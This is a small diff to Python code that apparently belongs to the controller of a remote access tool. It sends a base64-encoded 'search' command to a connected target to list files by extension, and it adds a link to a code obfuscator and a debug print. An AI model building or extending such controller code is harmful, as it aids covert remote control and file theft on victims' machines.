@@ -18,6 +18,8 @@ from prompt_toolkit.history import InMemoryHistory
 from prompt_toolkit.formatted_text import ANSI
 colorama.init()
 
+#https://pyob.oxyry.com/
+
 Y = Fore.LIGHTYELLOW_EX
 R = Fore.LIGHTRED_EX
 B = Fore.LIGHTBLUE_EX
@@ -693,10 +695,12 @@ def searchExt(command, ext, targetConn, cachedCommands):
         print(f"\n{Y}Cached Response:{END}")
         printFormedFiles(cachedCommands['commands'][command])
         return
+
     print(f"\n\t{Y}[*>] {END}Searching .{ext} files. This may take a {R}while{END}... \n")
     codedCommand = "c2VhcmNo {}".format(ext)
     targetConn.send(codedCommand.encode())
     buffer = targetConn.recv(2048)
+    print(buffer)
     if "prt".encode() in buffer:
         f = receiveFileList(targetConn)
     else:
